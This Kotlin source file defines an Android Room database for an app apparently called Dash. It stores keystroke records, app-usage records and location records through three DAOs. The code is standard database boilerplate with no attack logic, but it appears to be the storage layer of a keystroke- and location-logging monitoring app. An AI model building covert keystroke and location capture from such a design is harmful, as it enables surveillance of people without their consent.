package com.github.muneebwanee.dash.data.database  
  
import androidx.room.Database  
import androidx.room.Room  
import androidx.room.RoomDatabase  
import androidx.room.TypeConverters  
import android.content.Context  
import com.github.muneebwanee.dash.data.model.*  
  
@Database(  
    entities = [  
        KeystrokeData::class,  
        AppUsageData::class,  
        LocationData::class  
    ],  
    version = 1,  
    exportSchema = false  
)  
@TypeConverters(Converters::class)  
abstract class DashDatabase : RoomDatabase() {  
  
    abstract fun keystrokeDao(): KeystrokeDao  
    abstract fun appUsageDao(): AppUsageDao  
    abstract fun locationDao(): LocationDao  
  
    companion object {  
        @Volatile  
        private var INSTANCE: DashDatabase? = null  
  
        fun getDatabase(context: Context): DashDatabase {  
            return INSTANCE ?: synchronized(this) {  
                val instance = Room.databaseBuilder(  
                    context.applicationContext,  
                    DashDatabase::class.java,  
                    "dash_database"  
                )  
                    .fallbackToDestructiveMigration()  
                    .build()  
                INSTANCE = instance  
                instance  
            }  
        }  
    }  
}
